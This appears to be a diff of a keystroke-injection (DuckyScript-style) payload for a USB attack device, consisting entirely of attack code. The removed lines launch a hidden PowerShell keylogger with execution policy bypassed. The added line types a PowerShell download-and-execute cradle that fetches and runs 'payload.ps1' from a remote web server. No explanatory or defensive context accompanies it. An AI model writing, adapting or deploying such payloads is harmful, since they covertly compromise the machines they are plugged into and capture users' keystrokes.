@@ -1,6 +1,5 @@
-DELAY 1500
+DELAY 1000
 GUI r
-DELAY 600
-STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File keylogger.ps1' -WindowStyle Hidden; Start-Sleep 1; exit"
-DELAY 400
+DELAY 100
+STRING powershell "IEX (New-Object Net.WebClient).DownloadString('https://mywebserver/payload.ps1');"
 ENTER
